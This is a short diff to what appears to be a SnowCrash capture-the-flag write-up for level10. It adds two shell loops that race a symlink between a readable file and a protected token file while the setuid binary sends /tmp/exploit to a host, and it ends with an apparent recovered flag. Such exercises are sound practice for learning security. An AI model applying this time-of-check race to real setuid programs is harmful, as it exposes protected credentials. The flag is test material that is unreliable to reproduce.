@@ -4,4 +4,9 @@ level10@SnowCrash:~$ cat b
 
 ./level10:     file format elf32-i386
 
+script1 : 
+while true; do ./level10 /tmp/exploit <host>; done
+script2 : 
+while true; do ln -fs ~/level10 /tmp/exploit; ln -fs ~/token /tmp/exploit; done
+
 woupa2yuojeeaaed06riuj63c
